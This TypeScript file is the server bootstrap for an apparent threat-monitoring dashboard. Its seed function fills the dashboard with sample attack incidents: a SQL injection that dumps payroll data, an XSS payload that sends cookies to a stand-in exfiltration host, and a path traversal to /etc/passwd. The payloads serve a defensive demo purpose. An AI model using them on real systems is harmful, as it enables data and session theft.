import express from 'express';
import cors from 'cors';
import { CONFIG } from './config';
import { db } from './db/database';
import { redis } from './redis/client';
import { udpIngestServer } from './ingest/udp-ingest';
import { probeScheduler } from './prober/probe-scheduler';

// Routers
import { httpIngestRouter } from './ingest/http-ingest';
import { overviewRouter } from './routes/overview';
import { incidentsRouter } from './routes/incidents';
import { probesRouter } from './routes/probes';
import { threatsRouter } from './routes/threats';
import { queriesRouter } from './routes/queries';
import { advisorRouter } from './routes/advisor';
import { reportsRouter } from './routes/reports';
import { simulationRouter } from './routes/simulation';
import { ingestQueue } from './ingest/ingest-queue';

export const app = express();

app.use(cors());
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

// Request logging in development
app.use((req, res, next) => {
  if (req.path.startsWith('/api/v1/telemetry/ingest')) {
    // skip high-frequency ingest logs
    return next();
  }
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 100 || res.statusCode >= 400) {
      console.log(`[HTTP] ${req.method} ${req.path} -> ${res.statusCode} (${duration}ms)`);
    }
  });
  next();
});

// Mock routes for synthetic probe targets
app.get('/api/mock/noun/health', (req, res) => {
  res.json({ status: 'UP', service: 'NOUN-HRMS Core', timestamp: new Date().toISOString() });
});

app.get('/api/mock/noun/auth/session', (req, res) => {
  res.json({ status: 'VALID', activeSessions: 1420, sessionStore: 'Redis-Cluster-OK' });
});

app.get('/api/mock/noun/payroll/status', (req, res) => {
  res.json({ status: 'IDLE', batchQueue: 0, lastRun: '2026-09-20T12:00:00Z' });
});

app.get('/api/mock/clinic/health', (req, res) => {
  res.json({ status: 'UP', service: 'Clinic-EHR', dbHealth: 'CONNECTED' });
});

app.get('/api/mock/dispatch/health', (req, res) => {
  res.json({ status: 'UP', service: 'Security-Dispatch', webrtcRelay: 'OPERATIONAL' });
});

// REST API Routers
app.use('/api/v1/telemetry', httpIngestRouter);
app.use('/api/v1/overview', overviewRouter);
app.use('/api/v1/incidents', incidentsRouter);
app.use('/api/v1/probes', probesRouter);
app.use('/api/v1/threats', threatsRouter);
app.use('/api/v1/queries', queriesRouter);
app.use('/api/v1/advisor', advisorRouter);
app.use('/api/v1/reports', reportsRouter);
app.use('/api/v1/simulation', simulationRouter);

// Root health check
app.get('/health', (req, res) => {
  res.json({
    platform: 'The Watch: Threat Intelligence & Observability Platform',
    status: 'ONLINE',
    timezone: CONFIG.TIMEZONE,
    timestamp: new Date().toISOString(),
  });
});

async function seedInitialIncidents() {
  // Pre-seed a few realistic incidents so initial dashboard load is rich
  ingestQueue.enqueue([
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/export',
      statusCode: 500,
      latencyMs: 120,
      clientIp: '194.26.29.112',
      payloadSnippet: `dept_id=1' UNION SELECT staff_id, full_name, bvn, salary FROM staff_payroll WHERE '1'='1' --`,
      userAgent: 'sqlmap/1.7.2#stable',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/auth/session',
      statusCode: 400,
      latencyMs: 30,
      clientIp: '185.220.101.5',
      payloadSnippet: `<script>fetch('https://c2-exfil.tor/loot?c='+document.cookie)</script>`,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    },
    {
      systemId: 'Clinic-EHR',
      method: 'GET',
      path: '/api/v1/records/download?file=../../../../../../etc/passwd%00.pdf',
      statusCode: 403,
      latencyMs: 14,
      clientIp: '45.154.255.89',
      payloadSnippet: '../../../../../../etc/passwd',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/batch',
      statusCode: 200,
      latencyMs: 840,
      clientIp: '102.89.23.45',
      queryLatencyMs: 835.6,
      queryText: 'SELECT * FROM payroll_records WHERE tenant_id = $1 AND status = $2 ORDER BY created_at DESC',
    },
  ]);
}

export async function bootstrap(customPort?: number, customUdpPort?: number) {
  await db.initialize();
  await redis.initialize();

  const port = customPort || parseInt(process.env.PORT || '', 10) || CONFIG.PORT;
  const udpPort = customUdpPort || parseInt(process.env.UDP_PORT || '', 10) || CONFIG.UDP_PORT;

  // Start HTTP Server
  const server = app.listen(port, CONFIG.HOST, () => {
    console.log(`\n🛡️  ======================================================`);
    console.log(`🛡️  THE WATCH: Observability & Threat Intelligence Server`);
    console.log(`🛡️  HTTP API Gateway: http://${CONFIG.HOST}:${port}`);
    console.log(`🛡️  Timezone: ${CONFIG.TIMEZONE} (WAT / UTC+1)`);
    console.log(`🛡️  ======================================================\n`);
  });

  // Start UDP Server
  udpIngestServer.start(udpPort);

  // Start Synthetic Heartbeat Prober
  probeScheduler.start(30000);

  // Seed sample telemetry
  await seedInitialIncidents();

  return server;
}

if (process.env.NODE_ENV !== 'test') {
  bootstrap().catch((err) => {
    console.error('Fatal bootstrapping error:', err);
  });
}
